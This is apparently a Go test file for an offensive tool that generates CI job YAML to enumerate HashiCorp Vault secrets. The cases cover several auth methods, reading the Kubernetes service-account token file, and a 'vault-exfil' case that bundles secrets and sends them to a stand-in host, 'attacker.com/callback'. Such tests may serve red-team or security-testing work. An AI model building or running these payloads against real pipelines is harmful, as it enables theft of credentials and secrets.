package payloads

import (
	"strings"
	"testing"
)

func TestGenerateVaultEnumYAML(t *testing.T) {
	tests := []struct {
		name         string
		opts         VaultEnumOptions
		wantContains []string
	}{
		{
			name: "token auth defaults",
			opts: VaultEnumOptions{
				Common:    CommonOptions{JobName: "vault"},
				VaultAddr: "https://vault.internal:8200",
			},
			wantContains: []string{
				"VAULT_ADDR",
				"VAULT_TOKEN",
				"sys/mounts",
				"metadata",
				"secret",
				"vault.internal:8200",
			},
		},
		{
			name: "kubernetes auth",
			opts: VaultEnumOptions{
				Common:     CommonOptions{JobName: "vault-k8s", Tags: []string{"k8s-runner"}},
				AuthMethod: "kubernetes",
			},
			wantContains: []string{
				"VAULT_ADDR",
				"sys/mounts",
				"metadata",
				"kubernetes/login",
				"/var/run/secrets/kubernetes.io/serviceaccount/token",
			},
		},
		{
			name: "aws auth",
			opts: VaultEnumOptions{
				Common:     CommonOptions{JobName: "vault-aws"},
				AuthMethod: "aws",
				VaultAddr:  "https://vault.prod:8200",
			},
			wantContains: []string{
				"VAULT_ADDR",
				"sys/mounts",
				"metadata",
				"auth/aws/login",
				"VAULT_AWS_ROLE",
			},
		},
		{
			name: "custom mount paths",
			opts: VaultEnumOptions{
				Common:     CommonOptions{JobName: "vault-custom"},
				VaultAddr:  "https://vault:8200",
				MountPaths: []string{"infra", "apps/prod", "ci-secrets"},
			},
			wantContains: []string{
				"VAULT_ADDR",
				"sys/mounts",
				"infra/metadata",
				"apps/prod/metadata",
				"ci-secrets/metadata",
				"infra/data",
				"apps/prod/data",
				"ci-secrets/data",
			},
		},
		{
			name: "with callback",
			opts: VaultEnumOptions{
				Common:      CommonOptions{JobName: "vault-exfil", Manual: true},
				VaultAddr:   "https://vault:8200",
				CallbackURL: "https://attacker.com/callback",
			},
			wantContains: []string{
				"VAULT_ADDR",
				"sys/mounts",
				"metadata",
				"attacker.com/callback",
				"vault_bundle.tgz",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			y := GenerateVaultEnumYAML(tt.opts)
			for _, substr := range tt.wantContains {
				if !strings.Contains(y, substr) {
					t.Errorf("expected %q in output:\n%s", substr, y)
				}
			}
			_ = mustParse(t, y)
		})
	}
}
